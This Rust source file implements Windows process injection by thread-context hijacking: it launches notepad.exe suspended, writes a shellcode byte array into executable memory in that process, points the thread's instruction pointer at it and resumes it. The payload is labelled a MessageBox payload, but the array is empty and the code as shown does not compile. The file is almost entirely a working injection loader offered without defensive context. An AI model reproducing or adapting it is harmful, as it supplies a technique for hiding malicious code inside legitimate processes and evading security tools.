extern crate ntapi;
extern crate winapi;

use std::{
    ffi::CString,
    io::{Error, ErrorKind, Result},
    ptr,
};
use winapi::um::{
    errhandlingapi::GetLastError,
    handleapi::CloseHandle,
    memoryapi::{VirtualAllocEx, WriteProcessMemory},
    processthreadsapi::{
        CreateProcessA, GetThreadContext, ResumeThread, SetThreadContext, PROCESS_INFORMATION,
        STARTUPINFOA,
    },
    winbase::CREATE_SUSPENDED,
    winnt::{CONTEXT, CONTEXT_FULL, HANDLE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
};

fn main() -> Result<()> {
    // MessageBox payload
    let payload: Vec<u8> = vec![
        ,
    ];
    let (process, thread) = create_suspended_process("C:\\Windows\\System32\\notepad.exe")?;
    let mut context = get_thread_context(thread)?;
    let allocated_memory = write_memory(process, &payload)?;

    context.Rip = allocated_memory as u64;
    set_thread_context(thread, context)?;

    let resume_result = unsafe { ResumeThread(thread) };
    if resume_result + 1 == 0 {
        return Err(Error::new(
            ErrorKind::Other,
            format!("Failed to resume thread: {}", unsafe { GetLastError() }),
        ));
    }

    unsafe {
        CloseHandle(process);
        CloseHandle(thread);
    }

    Ok(())
}

fn create_suspended_process(path: &str) -> Result<(HANDLE, HANDLE)> {
    let target_process_path =
        CString::new(path).map_err(|e| Error::new(ErrorKind::InvalidInput, e.to_string()))?;
    let mut startup_info: STARTUPINFOA = unsafe { std::mem::zeroed() };
    let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let success = unsafe {
        CreateProcessA(
            target_process_path.as_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            CREATE_SUSPENDED,
            ptr::null_mut(),
            ptr::null(),
            &mut startup_info,
            &mut process_info,
        )
    };
    if success == 0 {
        return Err(Error::new(
            ErrorKind::Other,
            format!("Failed to create process: {}", unsafe { GetLastError() }),
        ));
    }

    Ok((process_info.hProcess, process_info.hThread))
}

fn get_thread_context(thread: HANDLE) -> Result<CONTEXT> {
    let mut context = CONTEXT {
        ContextFlags: CONTEXT_FULL,
        ..unsafe { std::mem::zeroed() }
    };

    let success = unsafe { GetThreadContext(thread, &mut context) };
    if success == 0 {
        return Err(Error::new(
            ErrorKind::Other,
            format!("Failed to get thread context: {}", unsafe {
                GetLastError()
            }),
        ));
    }

    Ok(context)
}

fn write_memory(process: HANDLE, payload: &[u8]) -> Result<*mut u8> {
    let allocated_memory = unsafe {
        VirtualAllocEx(
            process,
            ptr::null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if allocated_memory.is_null() {
        return Err(Error::new(
            ErrorKind::Other,
            format!("Failed allocating memory: {}", unsafe { GetLastError() }),
        ));
    }

    let success = unsafe {
        WriteProcessMemory(
            process,
            allocated_memory,
            payload.as_ptr() as *const _,
            payload.len(),
            ptr::null_mut(),
        )
    };
    if success == 0 {
        return Err(Error::new(
            ErrorKind::Other,
            format!("Failed to write memory: {}", unsafe { GetLastError() }),
        ));
    }

    Ok(allocated_memory as *mut u8)
}

fn set_thread_context(thread: HANDLE, mut context: CONTEXT) -> Result<()> {
    let success = unsafe { SetThreadContext(thread, &mut context) };
    if success == 0 {
        return Err(Error::new(
            ErrorKind::Other,
            format!("Failed to set thread context: {}", unsafe {
                GetLastError()
            }),
        ));
    }

    Ok(())
}
